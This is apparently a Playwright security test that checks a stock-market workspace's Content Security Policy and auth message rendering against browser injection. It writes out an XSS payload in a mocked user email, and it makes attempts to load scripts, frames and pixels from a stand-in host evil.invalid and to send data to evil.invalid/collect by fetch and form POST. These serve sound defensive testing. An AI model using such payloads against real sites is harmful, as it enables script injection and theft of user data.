import assert from "node:assert/strict";
import http from "node:http";
import path from "node:path";
import { readFile } from "node:fs/promises";
import { test } from "node:test";
import { chromium } from "playwright";

const root = process.cwd();
const mime = new Map([
  [".html", "text/html; charset=utf-8"], [".js", "text/javascript; charset=utf-8"],
  [".mjs", "text/javascript; charset=utf-8"], [".css", "text/css; charset=utf-8"],
  [".svg", "image/svg+xml"], [".webmanifest", "application/manifest+json"]
]);

test("authenticated workspace CSP and auth DOM resist browser injection", async () => {
  const server = http.createServer(async (req, res) => {
    const pathname = decodeURIComponent(new URL(req.url, "http://127.0.0.1").pathname);
    const resolved = path.resolve(root, "." + pathname);
    if (!resolved.startsWith(root + path.sep)) {
      res.writeHead(403).end();
      return;
    }
    try {
      const body = await readFile(resolved);
      res.writeHead(200, { "Content-Type": mime.get(path.extname(resolved)) || "application/octet-stream" });
      res.end(body);
    } catch {
      res.writeHead(404).end("not found");
    }
  });
  await new Promise(resolve => server.listen(0, "127.0.0.1", resolve));
  const address = server.address();
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext({ serviceWorkers: "block" });
  const page = await context.newPage();
  const violations = [];
  const pageErrors = [];
  const failedRequests = [];
  const responses = [];
  await page.addInitScript(() => {
    window.__cspViolations = [];
    document.addEventListener("securitypolicyviolation", event => {
      window.__cspViolations.push({
        directive: event.effectiveDirective,
        blockedURI: event.blockedURI
      });
    });
  });
  page.on("pageerror", error => pageErrors.push(error.message));
  page.on("requestfailed", request => failedRequests.push({ url: request.url(), error: request.failure()?.errorText }));
  page.on("response", response => responses.push({ url: response.url(), status: response.status() }));
  await page.route("https://esm.sh/**", route => route.fulfill({
    status: 200,
    contentType: "text/javascript",
    headers: { "access-control-allow-origin": "*" },
    body: `
      export function createClient() {
        const auth = {
          onAuthStateChange(callback) {
            globalThis.__mockAuthCallback = callback;
            return { data: { subscription: { unsubscribe() {} } } };
          },
          async getSession() { return { data: { session: null }, error: null }; },
          async signUp() { return { data: { session: null }, error: null }; },
          async signInWithPassword() { return { data: {}, error: null }; },
          async signOut() { return { error: null }; }
        };
        return { auth };
      }
    `
  }));

  try {
    await page.goto(`http://127.0.0.1:${address.port}/markets/stocks/index.html`, { waitUntil: "networkidle" });
    await page.locator("#email-auth-message").waitFor();
    const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute("content");
    assert.ok(csp, "workspace must declare a CSP meta policy");
    for (const forbidden of ["'unsafe-inline'", "'unsafe-eval'", "*"]) {
      assert.ok(!csp.includes(forbidden), `CSP must not contain ${forbidden}`);
    }
    assert.match(csp, /script-src[^;]*https:\/\/esm\.sh/);
    assert.match(csp, /connect-src[^;]*https:\/\/atvbjibhunvzpmfagagm\.supabase\.co/);
    assert.match(csp, /object-src\s+'none'/);
    assert.match(csp, /frame-src\s+'none'/);
    assert.match(csp, /form-action\s+'self'/);
    assert.match(csp, /style-src\s+'self'/);
    assert.doesNotMatch(csp, /frame-ancestors/i, "meta CSP cannot enforce frame-ancestors");

    await page.waitForFunction(() => typeof window.__mockAuthCallback === "function");
    await page.evaluate(() => {
      window.__xssExecuted = false;
      window.__mockAuthCallback("SIGNED_IN", {
        user: { email: '<img src=x onerror="window.__xssExecuted=true"><script>window.__xssExecuted=true</script>' }
      });
    });
    const authText = await page.locator("#email-auth-message").textContent();
    assert.match(authText, /<img src=x onerror=/, "untrusted identity text must remain text");
    assert.equal(await page.locator("#email-auth-message img, #email-auth-message script").count(), 0);
    assert.equal(await page.evaluate(() => window.__xssExecuted), false);

    await page.evaluate(() => {
      const inline = document.createElement("script");
      inline.textContent = "window.__inlineScriptExecuted = true";
      document.head.append(inline);
      const external = document.createElement("script");
      external.src = "https://evil.invalid/attack.js";
      document.head.append(external);
      const externalStyle = document.createElement("link");
      externalStyle.rel = "stylesheet";
      externalStyle.href = "https://evil.invalid/attack.css";
      document.head.append(externalStyle);
      fetch("https://evil.invalid/collect").catch(() => {});
      const frame = document.createElement("iframe");
      frame.src = "https://evil.invalid/frame";
      document.body.append(frame);
      const object = document.createElement("object");
      object.data = "data:text/html,blocked";
      document.body.append(object);
      const unsafeImage = document.createElement("img");
      unsafeImage.setAttribute("src", "https://evil.invalid/pixel.png");
      unsafeImage.setAttribute("onerror", "window.__handlerExecuted=true");
      document.body.append(unsafeImage);
      const form = document.createElement("form");
      form.method = "POST";
      form.action = "https://evil.invalid/collect";
      document.body.append(form);
      form.submit();
    });
    await page.waitForTimeout(150);
    const observed = await page.evaluate(() => ({
      violations: window.__cspViolations,
      inlineScriptExecuted: window.__inlineScriptExecuted === true,
      handlerExecuted: window.__handlerExecuted === true
    }));
    violations.push(...observed.violations);
    assert.equal(observed.inlineScriptExecuted, false, "inline script must be blocked");
    assert.equal(observed.handlerExecuted, false, "inline event handler must be blocked");
    const directives = new Set(violations.map(item => item.directive));
    for (const directive of ["script-src-elem", "script-src-attr", "style-src-elem", "connect-src", "frame-src", "object-src", "img-src", "form-action"]) {
      assert.ok(directives.has(directive), `expected CSP violation for ${directive}; got ${[...directives].join(", ")}`);
    }
    assert.deepEqual(pageErrors, [], "workspace should not throw uncaught browser exceptions");
    assert.equal(responses.some(item => item.url.includes("evil.invalid")), false,
      "CSP-blocked unauthorized origins must not receive a network response");
    assert.ok(failedRequests.some(item => item.url.includes("evil.invalid")),
      "browser should report attempted unauthorized requests as blocked/failed");
    console.log(JSON.stringify({ browser: "Chromium", cspViolations: violations, pageErrors, failedRequests, unauthorizedResponses: responses.filter(item => item.url.includes("evil.invalid")) }));
  } finally {
    await context.close();
    await browser.close();
    await new Promise(resolve => server.close(resolve));
  }
});
